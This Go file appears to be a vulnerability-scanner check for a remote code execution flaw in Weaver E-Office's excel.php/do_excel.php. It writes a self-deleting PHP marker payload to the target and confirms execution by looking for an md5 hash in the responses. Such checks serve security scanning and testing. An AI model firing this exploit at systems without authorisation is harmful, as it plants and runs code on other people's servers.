package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func E_Office_do_excel_php_rce(u string) bool {
	header := make(map[string]string)
	header["Content-Type"] = "application/x-www-form-urlencoded"
	header["Accept-Encoding"] = "gzip, deflate"

	payload := "html=<?php echo md5(233);unlink(__FILE__);?>"
	url := u + "/general/charge/charge_list/excel.php"
	url2 := u + "/general/charge/charge_list/do_excel.php"

	if req, err := pkg.HttpRequset(url, "POST", payload, false, header); err == nil {
		//pkg.GoPocLog(req.Body)
		if req2, err := pkg.HttpRequset(url, "GET", "", false, header); err == nil {
			if req.StatusCode == 200 && strings.Contains(req2.Body, "e165421110ba03099a1c0393373c5b43") {
				pkg.GoPocLog(fmt.Sprintf("Found vuln E_Office_do_excel_php_rce|%s\n", url))
				return true
			}
		}
		if req3, err := pkg.HttpRequset(url2, "GET", "", false, header); err == nil {

			if req.StatusCode == 200 && strings.Contains(req3.Body, "e165421110ba03099a1c0393373c5b43") {
				pkg.GoPocLog(fmt.Sprintf("Found vuln E_Office_do_excel_php_rce|%s\n", url2))
				return true
			}
		}
	}

	return false
}
